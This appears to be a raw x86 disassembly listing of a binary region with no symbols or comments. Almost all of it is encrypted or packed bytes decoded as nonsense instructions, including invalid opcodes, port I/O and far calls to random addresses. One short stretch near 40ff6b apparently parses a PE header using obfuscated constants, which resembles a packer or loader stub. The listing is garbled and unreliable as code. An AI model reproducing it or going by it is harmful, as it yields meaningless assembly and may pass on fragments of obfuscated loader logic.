  40f94f:	adc    ebx,DWORD PTR [di+0x2d]
  40f953:	pop    edx
  40f954:	jne    0x40f927
  40f956:	stc    
  40f957:	push   0xd34ea71d
  40f95c:	cmp    dl,BYTE PTR [ecx+edi*2]
  40f95f:	jbe    0x40f98a
  40f961:	and    DWORD PTR [edx+0x347bd148],ecx
  40f967:	cmp    DWORD PTR [edi],esp
  40f969:	sti    
  40f96a:	les    edi,FWORD PTR [ecx]
  40f96c:	(bad)  [bp+di-0x1522]
  40f971:	jnp    0x40f917
  40f973:	add    al,BYTE PTR [ecx+edi*2]
  40f976:	push   es
  40f977:	ror    cl,cl
  40f979:	sbb    DWORD PTR [esi+edx*1-0xb],esi
  40f97d:	mov    al,ds:0x6c323586
  40f982:	call   DWORD PTR [ebx-0x520f3ed9]
  40f988:	pop    ss
  40f989:	out    dx,al
  40f98a:	dec    esp
  40f98b:	fnstsw ax
  40f98d:	push   cs
  40f98e:	xlat   BYTE PTR ds:[ebx]
  40f98f:	jnp    0x40f97d
  40f991:	cmp    eax,0x65938fcf
  40f996:	in     al,dx
  40f997:	inc    edx
  40f998:	in     al,dx
  40f999:	mov    bl,0x97
  40f99b:	xor    al,0xaa
  40f99d:	test   al,0x52
  40f99f:	loop   0x40f9b6
  40f9a1:	data16 cmp BYTE PTR [edi],dl
  40f9a4:	push   ds
  40f9a5:	out    0x2b,eax
  40f9a7:	rcr    BYTE PTR [ecx],cl
  40f9a9:	ret    0x6ba2
  40f9ac:	xor    DWORD PTR [ebx+0x18],ebp
  40f9af:	je     0x40f9d0
  40f9b1:	fwait
  40f9b2:	push   cs
  40f9b3:	stc    
  40f9b4:	inc    esi
  40f9b5:	mov    cl,0x3a
  40f9b7:	call   FWORD PTR [edx-0x10]
  40f9ba:	fidiv  WORD PTR [edx]
  40f9bc:	push   0xffffffdf
  40f9be:	shl    DWORD PTR [ebp+0x75],cl
  40f9c1:	push   ebp
  40f9c2:	mov    ds:0xb2e747e2,al
  40f9c7:	pusha  
  40f9c8:	lods   al,BYTE PTR ds:[esi]
  40f9c9:	pop    es
  40f9ca:	out    0x16,al
  40f9cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9cd:	js     0x40f9ea
  40f9cf:	(bad)  
  40f9d0:	aaa    
  40f9d1:	bound  ebx,QWORD PTR [ebp+0x19]
  40f9d4:	or     ebx,0xb82a9a0b
  40f9da:	sbb    al,0x1c
  40f9dc:	ficom  WORD PTR [edi-0x6e]
  40f9df:	ins    BYTE PTR es:[edi],dx
  40f9e0:	shl    DWORD PTR [ecx+0x4c],cl
  40f9e3:	inc    edi
  40f9e4:	fdivr  DWORD PTR [eax-0x5f7da560]
  40f9ea:	das    
  40f9eb:	fmul   QWORD PTR [esi+ebp*4]
  40f9ee:	mov    ds,esi
  40f9f0:	or     dh,bl
  40f9f2:	push   esi
  40f9f3:	arpl   WORD PTR [ebx+0x680aa7ec],di
  40f9f9:	pop    es
  40f9fa:	das    
  40f9fb:	cmp    al,0xc1
  40f9fd:	push   ecx
  40f9fe:	mov    WORD PTR [ecx-0x4d35f74c],cs
  40fa04:	or     al,0x53
  40fa06:	rcl    bl,0xc9
  40fa09:	call   0x9d2fa320
  40fa0e:	test   eax,0xef21b471
  40fa13:	xchg   edx,eax
  40fa14:	out    0xc9,al
  40fa16:	and    BYTE PTR [ebx-0x3926c68],0x6
  40fa1d:	pop    ebx
  40fa1e:	lods   al,BYTE PTR ds:[esi]
  40fa1f:	inc    edx
  40fa20:	ins    DWORD PTR es:[edi],dx
  40fa21:	icebp  
  40fa22:	scas   al,BYTE PTR es:[edi]
  40fa23:	ins    BYTE PTR es:[edi],dx
  40fa24:	inc    esi
  40fa25:	and    ah,dh
  40fa27:	lods   eax,DWORD PTR ds:[esi]
  40fa28:	sti    
  40fa29:	pop    es
  40fa2a:	xchg   edx,eax
  40fa2b:	ret    
  40fa2c:	arpl   sp,sp
  40fa2e:	lea    ebp,[esi-0x1aa22590]
  40fa34:	mov    cl,0xbb
  40fa36:	cwde   
  40fa37:	and    eax,edx
  40fa39:	xor    eax,0x80d5605c
  40fa3e:	add    DWORD PTR [ecx-0x7a614f0],0x581d5e6b
  40fa48:	fcomp  DWORD PTR [eax+ecx*1-0x66786b53]
  40fa4f:	xor    ebp,DWORD PTR [esi+edi*4-0x19b96003]
  40fa56:	ins    BYTE PTR es:[edi],dx
  40fa57:	xor    DWORD PTR [ebx+0x6a],edi
  40fa5a:	or     bl,cl
  40fa5c:	icebp  
  40fa5d:	mov    bh,0xb2
  40fa5f:	fistp  DWORD PTR [edx+0x7e1c3dab]
  40fa65:	sbb    eax,0xf1a5d261
  40fa6a:	fbld   TBYTE PTR [edi]
  40fa6c:	rcl    ah,cl
  40fa6e:	and    dl,BYTE PTR [esi]
  40fa70:	xchg   edx,eax
  40fa71:	sbb    dl,BYTE PTR [edi]
  40fa73:	fisttp QWORD PTR [edi-0xde38c0f]
  40fa79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa7a:	sub    eax,0xdf7e2d75
  40fa7f:	iret   
  40fa80:	sbb    eax,0x3ec3e2e1
  40fa85:	jnp    0x40fa17
  40fa87:	xchg   esi,eax
  40fa88:	cs addr16 mov esi,0x3e03ed75
  40fa8f:	pop    esp
  40fa90:	enter  0x4409,0x2a
  40fa94:	xor    dh,BYTE PTR [eax-0x30]
  40fa97:	daa    
  40fa98:	out    dx,eax
  40fa99:	in     eax,dx
  40fa9a:	ret    
  40fa9b:	inc    esi
  40fa9c:	in     al,0x21
  40fa9e:	xor    DWORD PTR fs:[ecx+0x13e2e75b],ebp
  40faa5:	ins    BYTE PTR es:[edi],dx
  40faa6:	inc    esi
  40faa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faa8:	pop    esp
  40faa9:	test   eax,0xd79735cb
  40faae:	test   DWORD PTR [ecx-0x27dc8a22],0x2a69d4c6
  40fab8:	jge    0x40fa81
  40faba:	pop    ebx
  40fabb:	cdq    
  40fabc:	pop    ecx
  40fabd:	jno    0x40fb04
  40fabf:	outs   dx,DWORD PTR ds:[esi]
  40fac0:	mov    al,ds:0xabfe7df4
  40fac5:	xchg   esp,eax
  40fac6:	jg     0x40fa55
  40fac8:	mov    ah,0xbd
  40faca:	inc    ebp
  40facb:	pop    esp
  40facc:	push   DWORD PTR [ecx-0x6f6b3a75]
  40fad2:	add    BYTE PTR [edi+edx*4-0x5e],dh
  40fad6:	lods   al,BYTE PTR ds:[esi]
  40fad7:	mov    ds:0xf4aa7f99,al
  40fadc:	lds    edi,FWORD PTR [edx+0x24]
  40fadf:	jae    0x40fb50
  40fae1:	(bad)  
  40fae2:	fadd   QWORD PTR [edx+0x51]
  40fae5:	pop    ecx
  40fae6:	hlt    
  40fae7:	int3   
  40fae8:	in     eax,dx
  40fae9:	adc    al,BYTE PTR [esi+0x71bee657]
  40faef:	mov    ah,0xc2
  40faf1:	mov    ah,bh
  40faf3:	fistp  QWORD PTR [edi+0x27]
  40faf6:	test   al,0x56
  40faf8:	cli    
  40faf9:	call   0x5a7ddc18
  40fafe:	mov    gs,ebp
  40fb00:	push   esi
  40fb01:	into   
  40fb02:	mov    ah,0x32
  40fb04:	retf   
  40fb05:	nop
  40fb06:	out    0x6c,eax
  40fb08:	ss mov ch,0xf9
  40fb0b:	into   
  40fb0c:	mov    esp,0x40a42789
  40fb11:	mov    ah,BYTE PTR [ebx+esi*8-0x30ce14ef]
  40fb18:	mov    bh,0xd1
  40fb1a:	jo     0x40fab8
  40fb1c:	out    0x47,eax
  40fb1e:	or     al,0x25
  40fb20:	mov    ebx,0x4e79091e
  40fb25:	dec    bh
  40fb27:	mov    esi,0x9fe16909
  40fb2c:	std    
  40fb2d:	inc    ebx
  40fb2e:	test   DWORD PTR [edx],ecx
  40fb30:	aad    0x8c
  40fb32:	pop    ebp
  40fb33:	xor    eax,0x568c25a9
  40fb38:	test   eax,0x80fb1c7b
  40fb3d:	je     0x40fb9a
  40fb3f:	and    al,BYTE PTR [ecx+0x772d101e]
  40fb45:	clc    
  40fb46:	test   eax,0xc9b7cb94
  40fb4b:	and    BYTE PTR [ecx+0x3f],dl
  40fb4e:	sbb    ah,ah
  40fb50:	in     al,0xb6
  40fb52:	les    esp,FWORD PTR gs:[ebp-0x69955d86]
  40fb59:	mov    ebp,0x8de4b573
  40fb5e:	mov    ds:0xb96a8641,al
  40fb63:	aaa    
  40fb64:	test   al,0xb3
  40fb66:	stos   DWORD PTR es:[edi],eax
  40fb67:	fldcw  WORD PTR [ebx-0x1751085c]
  40fb6d:	lahf   
  40fb6e:	lahf   
  40fb6f:	xchg   edi,eax
  40fb70:	and    al,0x96
  40fb72:	xchg   esi,eax
  40fb73:	(bad)  
  40fb74:	xchg   esi,eax
  40fb75:	mov    ds:0xd65e5371,al
  40fb7a:	bound  ebp,QWORD PTR [ebx+0x5f2a42bb]
  40fb80:	(bad)  [eax+0x6b71e1fd]
  40fb86:	mov    ch,0x26
  40fb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb89:	xchg   edi,eax
  40fb8a:	stos   DWORD PTR es:[edi],eax
  40fb8b:	xchg   ebp,eax
  40fb8c:	(bad)  
  40fb8e:	das    
  40fb8f:	sbb    eax,0x9fed5b9d
  40fb94:	xor    edi,ebx
  40fb96:	cs sar bl,cl
  40fb99:	es push ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x7d
  40fbb3:	cmp    edi,DWORD PTR [ebx]
  40fbb5:	adc    eax,0x7070b182
  40fbba:	mov    ds:0xcf70707d,eax
  40fbbf:	ffree  st(2)
  40fbc1:	sbb    al,0xd4
  40fbc3:	jge    0x40fbb3
  40fbc5:	mov    ecx,0xbfd31638
  40fbca:	shl    BYTE PTR [edi+0x75],0xfa
  40fbce:	mov    dl,0x15
  40fbd0:	leave  
  40fbd1:	jecxz  0x40fc14
  40fbd3:	cmp    esp,DWORD PTR [ebp+0x5a121a28]
  40fbd9:	outs   dx,BYTE PTR ds:[esi]
  40fbda:	mov    edx,0xb870197
  40fbdf:	mov    eax,ds:0xa49a35b1
  40fbe4:	ds shl esp,0xbe
  40fbe8:	test   esi,0xb896af7
  40fbee:	scas   eax,DWORD PTR es:[edi]
  40fbef:	test   al,0xb3
  40fbf1:	clc    
  40fbf2:	push   ss
  40fbf3:	sar    DWORD PTR [edx+0x3ee87619],1
  40fbf9:	sahf   
  40fbfa:	test   al,0x1c
  40fbfc:	mov    eax,0x9b548165
  40fc01:	mov    ecx,0xa1296523
  40fc06:	inc    ecx
  40fc07:	out    dx,eax
  40fc08:	fwait
  40fc09:	push   ebx
  40fc0a:	add    ecx,DWORD PTR [eax]
  40fc0c:	int    0x7b
  40fc0e:	or     bh,0x4f
  40fc11:	inc    edi
  40fc12:	test   cl,dl
  40fc14:	pmulhw mm1,QWORD PTR [ebp+0x10ffa6cb]
  40fc1b:	stos   DWORD PTR es:[edi],eax
  40fc1c:	jg     0x40fc82
  40fc1e:	mov    ecx,0x73e4c4de
  40fc23:	mov    ebx,0x98f07fda
  40fc28:	test   DWORD PTR [ebx-0x3c],esi
  40fc2b:	jmp    0x40fc8b
  40fc2d:	in     eax,0xe3
  40fc2f:	arpl   sp,ax
  40fc31:	sti    
  40fc32:	imul   esi,edi,0xf70ae3a2
  40fc38:	das    
  40fc39:	xchg   edx,eax
  40fc3a:	test   eax,0xf084cc69
  40fc3f:	pop    esp
  40fc40:	fbld   TBYTE PTR [ecx+0x32]
  40fc43:	lock int 0x3e
  40fc46:	inc    ebp
  40fc47:	add    ebx,DWORD PTR [eax]
  40fc49:	aad    0x2
  40fc4b:	imul   edx,DWORD PTR [esi+0x32],0xd915837
  40fc52:	pop    esp
  40fc53:	ret    0x413d
  40fc56:	adc    eax,0xfe7231d3
  40fc5b:	pop    edx
  40fc5c:	scas   eax,DWORD PTR es:[edi]
  40fc5d:	add    al,0x52
  40fc5f:	ja     0x40fcc1
  40fc61:	dec    edi
  40fc62:	les    esp,FWORD PTR [esi-0x31fc363c]
  40fc68:	ret    
  40fc69:	push   esp
  40fc6a:	pushf  
  40fc6b:	dec    esp
  40fc6c:	add    eax,0x8cd440c8
  40fc71:	shr    DWORD PTR [eax],0x82
  40fc74:	ret    0x7d72
  40fc77:	mov    esi,DWORD PTR [edi]
  40fc79:	iret   
  40fc7a:	or     BYTE PTR [edx-0x2e6ef6f6],dl
  40fc80:	mov    edi,DWORD PTR [ebx]
  40fc82:	add    ebx,0x350c6053
  40fc88:	cmp    eax,0x3f2949c3
  40fc8d:	mov    al,ds:0xf9fc38ab
  40fc92:	sar    BYTE PTR [ecx+0x7d069b2e],0xc3
  40fc99:	mov    BYTE PTR [edi],0x2b
  40fc9c:	cmp    al,0xbc
  40fc9e:	test   BYTE PTR [ebx+esi*4],0x66
  40fca2:	aam    0xa3
  40fca4:	mov    dh,ch
  40fca6:	xchg   edi,eax
  40fca7:	jle    0x40fd17
  40fca9:	(bad)  
  40fcaa:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcac:	mov    bh,0x76
  40fcae:	out    dx,eax
  40fcaf:	fcomi  st,st(5)
  40fcb1:	and    eax,0xdfb699a5
  40fcb6:	pop    ecx
  40fcb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcb8:	push   esp
  40fcb9:	jmp    0x692f53da
  40fcbe:	lea    ebx,[eax+0x6]
  40fcc1:	sahf   
  40fcc2:	jbe    0x40fc70
  40fcc4:	sub    dh,ah
  40fcc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc7:	neg    esp
  40fcc9:	jmp    FWORD PTR [esi]
  40fccb:	call   0xa66d:0x1a859ff1
  40fcd2:	pop    ebp
  40fcd3:	repz gs sub eax,0xb86a4559
  40fcda:	daa    
  40fcdb:	or     edi,ebp
  40fcdd:	repz inc eax
  40fcdf:	popf   
  40fce0:	sbb    DWORD PTR [ebp+0x30],ebx
  40fce3:	loope  0x40fcb6
  40fce5:	jg     0x40fd29
  40fce7:	push   edx
  40fce8:	mov    esp,0xd23e3d94
  40fced:	loope  0x40fcd6
  40fcef:	mov    dh,0x83
  40fcf1:	mov    ecx,0x4c87ae7c
  40fcf6:	cmp    al,0xe4
  40fcf8:	or     DWORD PTR [eax+edx*2-0x24],ecx
  40fcfc:	add    eax,0xb1f667ae
  40fd01:	cmp    ecx,DWORD PTR [edi+0x3b]
  40fd04:	xchg   ebx,eax
  40fd05:	mov    WORD PTR [ebp+0x542958a2],cs
  40fd0b:	mov    ds:0x7cd8c868,al
  40fd10:	iret   
  40fd11:	dec    eax
  40fd12:	jl     0x40fd75
  40fd14:	mov    dh,0xfd
  40fd16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd17:	mov    bh,0x9e
  40fd19:	pop    esi
  40fd1a:	imul   esp,DWORD PTR [eax],0x57be2ac2
  40fd20:	sahf   
  40fd21:	cmp    ah,cl
  40fd23:	fmul   QWORD PTR [ebx+0x3d67b379]
  40fd29:	pop    ecx
  40fd2a:	sub    al,0xb2
  40fd2c:	xchg   ebx,eax
  40fd2d:	rcl    esp,1
  40fd2f:	sub    al,0x1c
  40fd31:	(bad)  
  40fd32:	out    0xba,eax
  40fd34:	fidiv  DWORD PTR [ebx]
  40fd36:	sti    
  40fd37:	dec    ecx
  40fd38:	ret    
  40fd39:	or     dl,bh
  40fd3b:	lods   al,BYTE PTR ds:[esi]
  40fd3c:	imul   edx,DWORD PTR [ecx+0x44],0x810e5a51
  40fd43:	mov    ebx,0x4ab26104
  40fd48:	repz fiadd WORD PTR [ebp-0x28]
  40fd4c:	mov    bh,0x2f
  40fd4e:	sub    DWORD PTR [eax+0x76],eax
  40fd51:	add    edx,DWORD PTR [esp+eiz*8+0x1f]
  40fd55:	test   DWORD PTR [ebp+0x4948543a],0xebfba585
  40fd5f:	ins    BYTE PTR es:[edi],dx
  40fd60:	or     al,0x35
  40fd62:	fidiv  DWORD PTR [edi+esi*2-0xc362a2f]
  40fd69:	push   edi
  40fd6a:	gs pop ebx
  40fd6c:	bound  edx,QWORD PTR [esi-0x7e]
  40fd6f:	mov    ds:0xacbe16ee,eax
  40fd74:	fs lock jg 0x40fdb4
  40fd78:	in     al,dx
  40fd79:	sar    BYTE PTR [ecx-0x4e4405b5],0xc9
  40fd80:	inc    ebp
  40fd81:	js     0x40fdd0
  40fd83:	scas   eax,DWORD PTR es:[edi]
  40fd84:	adc    esi,DWORD PTR [ebx-0x33]
  40fd87:	scas   eax,DWORD PTR es:[edi]
  40fd88:	add    al,dh
  40fd8a:	in     eax,dx
  40fd8b:	aaa    
  40fd8c:	bound  eax,QWORD PTR [ebx-0x43]
  40fd8f:	sbb    DWORD PTR [edi+esi*1+0x56],esi
  40fd93:	in     al,dx
  40fd94:	addr16 mov edx,0x1c9cbf69
  40fd9a:	pop    ecx
  40fd9b:	sbb    edx,ebx
  40fd9d:	jne    0x40fdf4
  40fd9f:	push   edx
  40fda0:	dec    ebp
  40fda1:	ret    
  40fda2:	aam    0x98
  40fda4:	and    eax,0x2b95ceca
  40fda9:	xlat   BYTE PTR ds:[ebx]
  40fdaa:	pushf  
  40fdab:	stos   BYTE PTR es:[edi],al
  40fdac:	xor    esi,DWORD PTR [esp+eiz*8-0x735324d5]
  40fdb3:	enter  0x3496,0x3a
  40fdb7:	(bad)  
  40fdb9:	fisub  WORD PTR [esp+ebx*2-0x14a19db1]
  40fdc0:	jle    0x40fde8
  40fdc2:	test   DWORD PTR [ebx-0x4d],edi
  40fdc5:	pmaxsw mm0,mm0
  40fdc8:	sbb    DWORD PTR [ebx-0x50469169],edx
  40fdce:	ja     0x40fdf2
  40fdd0:	out    dx,al
  40fdd1:	or     eax,0xc1fbb1f5
  40fdd6:	ficom  WORD PTR [esi+0x73cd2646]
  40fddc:	sbb    eax,0xdb216ab8
  40fde1:	(bad)  
  40fde2:	mov    esp,0xf6add47f
  40fde7:	repz pushf 
  40fde9:	push   esp
  40fdea:	add    eax,0xad02991c
  40fdef:	shl    BYTE PTR [ebp-0x77],1
  40fdf2:	mov    cl,0x6
  40fdf4:	add    ebp,DWORD PTR [edx+esi*8]
  40fdf7:	inc    eax
  40fdf8:	fsubr  st,st(0)
  40fdfa:	in     eax,0xf6
  40fdfc:	xchg   BYTE PTR [edi+ecx*1],ah
  40fdff:	pop    edi
  40fe00:	daa    
  40fe01:	mov    ds:0x3f8df057,eax
  40fe06:	dec    esi
  40fe07:	fidiv  WORD PTR [ebp+0x521054df]
  40fe0d:	in     al,0x68
  40fe0f:	and    esi,DWORD PTR [esi+0x696ae5bb]
  40fe15:	fnstenv [edx+0x40]
  40fe18:	dec    esi
  40fe19:	inc    edx
  40fe1a:	test   eax,0xab6992a9
  40fe1f:	iret   
  40fe20:	rol    BYTE PTR [eax+eiz*2-0x496f6aff],1
  40fe27:	or     DWORD PTR [edx+0xf],ebp
  40fe2a:	neg    DWORD PTR [esi-0x49dd5330]
  40fe30:	jo     0x40fe35
  40fe32:	sbb    dh,BYTE PTR [esi+ebp*1]
  40fe35:	pop    ds
  40fe36:	test   BYTE PTR ds:0xc0cba0e9,dh
  40fe3c:	and    DWORD PTR [ecx],ebx
  40fe3e:	js     0x40fead
  40fe40:	push   ss
  40fe41:	pop    ebp
  40fe42:	pop    es
  40fe43:	clc    
  40fe44:	clc    
  40fe45:	jl     0x40fe97
  40fe47:	mov    eax,ds:0x6e96c541
  40fe4c:	jbe    0x40fe81
  40fe4e:	push   edx
  40fe4f:	popa   
  40fe50:	xchg   DWORD PTR gs:[eax],edx
  40fe53:	xchg   ebx,eax
  40fe54:	push   ds
  40fe55:	sbb    DWORD PTR [ebp+0xc],edx
  40fe58:	add    BYTE PTR [eax],ah
  40fe5a:	pop    ebx
  40fe5b:	xor    eax,0xcccfda9
  40fe60:	or     eax,0x8553720f
  40fe65:	push   ds
  40fe66:	in     al,dx
  40fe67:	mov    edx,0x3adfff8a
  40fe6c:	fld    TBYTE PTR [edi+0x49afa054]
  40fe72:	jb     0x40fe93
  40fe74:	in     eax,dx
  40fe75:	js     0x40fe85
  40fe77:	outs   dx,BYTE PTR ds:[esi]
  40fe78:	sti    
  40fe79:	stos   BYTE PTR es:[edi],al
  40fe7a:	stos   BYTE PTR es:[edi],al
  40fe7b:	lock pop edx
  40fe7d:	retf   0xb77e
  40fe80:	shr    DWORD PTR [edx-0x65],0x40
  40fe84:	lea    ecx,[ebp-0x1044ee7a]
  40fe8a:	push   ebx
  40fe8b:	(bad)
  40fe8f:	mov    ds,WORD PTR [esi]
  40fe91:	test   dl,ah
  40fe93:	or     esp,esi
  40fe95:	jbe    0x40fe2f
  40fe97:	popa   
  40fe98:	sbb    ah,ch
  40fe9a:	cmp    eax,0xd4401a74
  40fe9f:	test   BYTE PTR [edi+0x74382e9f],0x94
  40fea6:	push   ds
  40fea7:	dec    ecx
  40fea8:	popf   
  40fea9:	sub    DWORD PTR [eax],esp
  40feab:	pop    ebp
  40feac:	aad    0x8b
  40feae:	stos   BYTE PTR es:[edi],al
  40feaf:	cwde   
  40feb0:	xchg   esp,eax
  40feb1:	mov    ch,0xb4
  40feb3:	dec    ebx
  40feb4:	push   ecx
  40feb5:	pop    edx
  40feb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feb7:	in     eax,dx
  40feb8:	mov    esp,0x37c16f31
  40febd:	stc    
  40febe:	mov    bh,0x60
  40fec0:	aas    
  40fec1:	xor    DWORD PTR [ebx+ebx*2-0x4420ce55],edx
  40fec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fec9:	dec    esp
  40feca:	adc    al,0x56
  40fecc:	call   0x3d71:0x2f858c02
  40fed3:	jo     0x40feca
  40fed5:	fwait
  40fed6:	ret    
  40fed7:	or     eax,0x859dc073
  40fedc:	push   ss
  40fedd:	sbb    BYTE PTR [esi],bl
  40fedf:	jg     0x40ff3a
  40fee1:	sub    esp,DWORD PTR [edi]
  40fee3:	mov    esi,0x1ea7776a
  40fee9:	ins    BYTE PTR es:[edi],dx
  40feea:	sbb    BYTE PTR [ecx],al
  40feec:	scas   al,BYTE PTR es:[edi]
  40feed:	addr16 jb 0x40ff5e
  40fef0:	sbb    eax,0x8fe93d41
  40fef5:	xor    esp,DWORD PTR [ebx+0x60]
  40fef8:	idiv   BYTE PTR [eax]
  40fefa:	icebp  
  40fefb:	add    al,0xa2
  40fefd:	cld    
  40fefe:	fs ins BYTE PTR es:[edi],dx
  40ff00:	add    BYTE PTR ds:0xa3246777,bh
  40ff06:	push   0x11
  40ff08:	rcr    BYTE PTR [esi+0x3763ecb],1
  40ff0e:	xchg   edi,eax
  40ff0f:	cmp    dh,ch
  40ff11:	mov    ds:0x7c3d006,eax
  40ff16:	sbb    ah,bh
  40ff18:	jnp    0x40ff07
  40ff1a:	push   edx
  40ff1b:	test   al,0x9d
  40ff1d:	pop    ss
  40ff1e:	sbb    eax,0x4ba9d522
  40ff23:	or     eax,0xee2f37d3
  40ff28:	(bad)
  40ff2c:	mov    ch,0xc2
  40ff2e:	imul   ebp,DWORD PTR [ebx],0x72
  40ff31:	mov    esp,0xda36e30b
  40ff36:	clc    
  40ff37:	ror    eax,0x74
  40ff3a:	lock adc eax,DWORD PTR [edi]
  40ff3d:	mov    BYTE PTR [ebx+eiz*4-0x66d661dd],ch
  40ff44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff45:	inc    ecx
  40ff46:	jo     0x40ff85
  40ff48:	inc    ecx
  40ff49:	push   ebx
  40ff4a:	dec    ecx
  40ff4b:	inc    edi
  40ff4c:	dec    edx
  40ff4d:	push   ebx
  40ff4e:	dec    edx
  40ff4f:	test   al,0x77
  40ff51:	push   esi
  40ff52:	es add al,0x95
  40ff55:	test   DWORD PTR [edx],eax
  40ff57:	xchg   edx,eax
  40ff58:	or     edx,ebp
  40ff5a:	pop    ebx
  40ff5b:	mov    cl,0x6e
  40ff5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff5e:	lock aaa 
  40ff60:	in     al,dx
  40ff61:	jg     0x40ffa1
  40ff63:	mov    bl,0x91
  40ff65:	stc    
  40ff66:	cpuid  
  40ff68:	std    
  40ff69:	sub    al,0x22
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e134,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	fsub   DWORD PTR [edx]
  40ffde:	hlt    
  40ffdf:	xchg   BYTE PTR ds:0xa37070bd,dh
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x40ff9e
  40ffe9:	outs   dx,BYTE PTR ds:[esi]
  40ffea:	and    eax,0x3ee6be5d
  40ffef:	inc    ebx
  40fff0:	es jle 0x410065
  40fff3:	add    esp,ecx
  40fff5:	inc    eax
  40fff6:	dec    ebp
  40fff7:	idiv   eax
  40fff9:	jno    0x41004f
  40fffb:	push   cs
  40fffc:	or     eax,0xa8237ca4
  410001:	sub    eax,0xa6047e60
  410006:	test   eax,0xfd5118ae
  41000b:	pop    es
  41000c:	push   ecx
  41000d:	cmp    eax,DWORD PTR es:[ebx+0x4]
  410011:	mov    esi,DWORD PTR [ebx-0x7b8a0895]
  410017:	add    eax,0xe6943b23
  41001c:	push   cs
  41001d:	sbb    al,0x55
  41001f:	cwde   
  410020:	xchg   esi,eax
  410021:	pop    esi
  410022:	pop    ecx
  410023:	or     edx,DWORD PTR [ecx-0x5611e1ad]
  410029:	push   edx
  41002a:	pop    eax
  41002b:	cdq    
  41002c:	dec    ebx
  41002d:	mov    ds:0xa443d841,eax
  410032:	jmp    0x410047
  410034:	adc    DWORD PTR [edi-0x7142cabd],esi
  41003a:	in     eax,0x3e
  41003c:	dec    esi
  41003d:	in     al,0x87
  41003f:	call   0x6bee5bd7
  410044:	jl     0x40ffe2
  410046:	sub    edi,DWORD PTR [ebx-0x5e5e32af]
  41004c:	and    eax,0xa115e847
  410051:	push   es
  410052:	or     edi,DWORD PTR [eax+ebx*4+0x6c]
  410056:	fwait
  410057:	int    0xd5
  410059:	leave  
  41005a:	xchg   esp,eax
  41005b:	fsub   st,st(0)
  41005d:	and    edi,DWORD PTR ds:[edx-0x68]
  410061:	idiv   BYTE PTR [ebp-0x29]
  410064:	dec    ecx
  410065:	fnstcw WORD PTR [ecx+0x27]
  410068:	cmp    BYTE PTR [ecx+0x3e],0xe5
  41006c:	sbb    esi,eax
  41006e:	mov    ecx,DWORD PTR [esi-0xe]
  410071:	pop    ds
  410072:	or     BYTE PTR [edi+0xf],ch
  410075:	je     0x410080
  410077:	adc    ecx,DWORD PTR ds:0xa55fdfeb
  41007d:	jg     0x410026
  41007f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410080:	out    dx,eax
  410081:	sub    edx,esp
  410083:	test   al,0x42
  410085:	cmp    DWORD PTR [esi-0x1f],edi
  410088:	xor    BYTE PTR [ebp+0x886d1d5],dh
  41008e:	mov    al,ds:0xf26651d6
  410093:	sbb    al,0x95
  410095:	or     esp,DWORD PTR [eax-0x55]
  410098:	dec    ebp
  410099:	fdecstp 
  41009b:	mov    WORD PTR [ebx+0x41797c77],?
  4100a1:	xchg   esi,eax
  4100a2:	push   edi
  4100a3:	retf   0xbccd
  4100a6:	xchg   DWORD PTR [esi+0x37],esp
  4100a9:	or     al,0xa3
  4100ab:	jne    0x4100ac
  4100ad:	dec    edx
  4100ae:	leave  
  4100af:	push   es
  4100b0:	or     DWORD PTR [esi-0x6afcc564],edi
  4100b6:	lahf   
  4100b7:	adc    BYTE PTR [si+0x6b],ah
  4100bb:	das    
  4100bc:	push   esi
  4100bd:	pop    edi
  4100bf:	nop
  4100c0:	fisub  DWORD PTR ds:[eax+0x76]
  4100c4:	xchg   edx,eax
  4100c5:	fcmovb st,st(2)
  4100c7:	push   cs
  4100c8:	fld    TBYTE PTR [eax]
  4100ca:	int3   
  4100cb:	jmp    0x230a3559
  4100d0:	jns    0x410099
  4100d2:	mov    edi,0x8f2b0d5d
  4100d7:	sub    eax,eax
  4100d9:	push   ebx
  4100da:	or     dh,dh
  4100dc:	(bad)  
  4100dd:	ss nop
  4100df:	push   esp
  4100e0:	(bad)  
  4100e1:	and    DWORD PTR [edx+0x44],edx
  4100e4:	and    BYTE PTR [eax],ah
  4100e6:	xchg   edx,eax
  4100e7:	pusha  
  4100e8:	cmp    ebp,DWORD PTR [esi+0x1161a2e8]
